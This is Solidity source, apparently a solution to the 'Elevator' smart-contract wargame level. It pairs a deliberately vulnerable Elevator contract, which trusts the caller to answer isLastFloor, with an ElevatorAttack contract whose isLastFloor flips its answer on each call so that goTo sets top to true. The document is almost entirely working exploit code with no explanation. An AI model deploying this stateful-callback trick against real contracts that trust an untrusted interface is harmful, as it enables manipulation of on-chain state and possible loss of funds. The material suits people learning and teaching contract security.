// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
	function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
	bool public top;
	uint256 public floor;

	function goTo(uint256 _floor) public {
		Building building = Building(msg.sender);

		if (!building.isLastFloor(_floor)) {
			floor = _floor;
			top = building.isLastFloor(floor);
		}
	}
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Elevator.sol";

contract ElevatorAttack is Building {
	Elevator public elevator;
	bool public toggle = true;

	constructor(address _elevator) {
		elevator = Elevator(_elevator);
	}

	function isLastFloor(uint256) external override returns (bool) {
		toggle = !toggle;
		return toggle;
	}

	function attack(uint256 _floor) public {
		elevator.goTo(_floor);
	}
}